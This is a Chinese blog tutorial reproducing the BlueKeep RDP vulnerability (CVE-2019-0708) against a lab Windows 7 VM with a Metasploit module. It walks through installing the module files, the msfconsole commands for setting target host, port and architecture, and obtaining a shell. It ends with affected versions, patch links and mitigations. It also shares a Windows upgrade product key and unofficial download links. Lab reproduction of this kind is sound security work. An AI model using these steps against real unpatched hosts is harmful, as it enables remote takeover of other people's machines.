# CVE-2019-0708 RDP MSF 漏洞利用 - Oran9e - 博客园

> 原文：[`www.cnblogs.com/Oran9e/p/11479575.html`](https://www.cnblogs.com/Oran9e/p/11479575.html)

CVE-2019-0708 RDP MSF 漏洞复现

**漏洞环境**

使用 VMware 安装 Windows7 X64 模拟受害机

Windows7 X64 下载链接：链接: https://pan.baidu.com/s/1A_b2PCbzInKx3hMkUz1xUg 提取码: fiwx 

![](img/076a7afad0a48d544243aea207bea1e7.png)

**EXP**

**kali msf 攻击准备：**

1，metasploit-framework， kali msf  需更新到最新版本，如果正常打开输入：msfupdate 进行更新，如果启动 msf 报错，可以卸载重新安装：

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall

```

2，MSF 下载 Reference 中的攻击套件放置文件到 msf 的相应文件夹(如果已存在同名文件,直接覆盖即可) 。

链接: https://pan.baidu.com/s/1m1N0RLBhLRTMLy56DFke-g 提取码: kw7b

```
rdp.rb   ->   /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb
rdp_scanner.rb   ->   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb
cve_2019_0708_bluekeep.rb   ->   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb
cve_2019_0708_bluekeep_rce.rb   ->   /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
```

**window7 X64 攻击准备：**

1，如果下载到的 Win7 X64 是家庭普通版，是需要升级到旗舰版或者专业版，因为家庭普通版是没有远程连接这个功能的。

 ![](img/4ab4b660499d14b6d8be09c283ec850c.png)

点击开始，找到 Windows Anytime Upgrade

![](img/cce00986608b207439cf060dc15b5738.png)![](img/7a5afb8d4e659d98e384c36ad998fe37.png)

这里输入密钥：6K2KY-BFH24-PJW6W-9GK29-TMPWP

下一步 ，验证密钥，等待验证密钥。如果密钥验证成功，会出现请接受许可条款，如果密钥验证不成功，则下面的步骤不可用，那可以返回，重新在网上找升级密钥，直至密钥验证成功。点我接受，升级系统大概花 10 分钟的时间，联网升级，在升级过程中，电脑会重启数次，认真等待。

2，开启 3389 端口，允许远程桌面连接；修改高级共享设置，默认是关闭的；

![](img/79e4fc9ecb8b27dff402ca7daf37e333.png)![](img/0b5fb2724a8eaee21d3d0f2522b89244.png)

启动远程桌面服务，默认是禁止的；

![](img/88e9103f67b96f614642f55915f53c19.png)

修改防火墙设置，增加一条允许连接 tcp 3389 端口的出站入站记录；

![](img/fbe2387009eb1da81f3ab4128549a3ba.png)

这样就可以开启远程连接了，一般是允许远程桌面连接和启动远程桌面服务就可以了，如果仍然不行的话就把上面的准备全部操作一遍。

**进行攻击：**

使用 msfconsole 进入 metasploit-framework

进入以后使用 reload_all 重新加载 0708rdp 利用模块

使用 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce 启用 0708RDP 攻击模块

使用 show options 查看相关信息和设置

 ![](img/ed34a27801297de515bf1f6f3b7b96af.png)

关键设置主要为 RHOSTS / RPORT / target

set RHOSTS 受害机 IP 设置受害机 IP

set RPORT 受害机 PORT 设置受害机 RDP 端口号

set target ID 数字(可选为 0-4)设置受害机机器架构

使用的是 VMware，那么 target 2 满足条件

使用 exploit 开始攻击，等待建立连接

![](img/b3abd6d26ece176e28babe4cc819714b.png)

建立连接以后，使用 `shell `获得 shell，再使用 `python `获得交互式 shell 

![](img/4a3f586971788f5cbd3d474e7fdd65d5.png)

完成攻击，成功拿到受害者主机权限。

![](img/cbd829c4eedc0dc4ac2c0c445d48295b.png)

打完收工。

### Reference

https://github.com/rapid7/metasploit-framework/pull/12283/files

https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708

https://pan.baidu.com/s/1A_b2PCbzInKx3hMkUz1xUg 提取码: fiwx 

https://pan.baidu.com/s/1m1N0RLBhLRTMLy56DFke-g 提取码: kw7b

参考自清水师傅的文章（https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961）

**受影响 Windows 系统版本：**
Windows 7
Windows Server 2008 R2
Windows Server 2008
Windows 2003
Windows XP

修复方法：微软已经于 2019 年 05 月 4 日发布了漏洞补丁，请进行相关升级：https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-0708#ID0EWIAC
Windows XP 及 Windows 2003 可以在以下链接下载补丁：https://support.microsoft.com/en-us/help/4500705/customer-guidance-for-cve-2019-0708

临时解决方案
1、如暂时无法更新补丁，可以通过在系统上启用网络及身份认证（NLA）以暂时规避该漏洞影响。
2、在网络外围防火墙阻断 TCP 端口 3389 的连接，或对相关服务器做访问来源过滤，只允许可信 IP 连接。
3、禁用远程桌面服务。本文链接（https://www.cnblogs.com/Oran9e/p/11479575.html），转载请注明。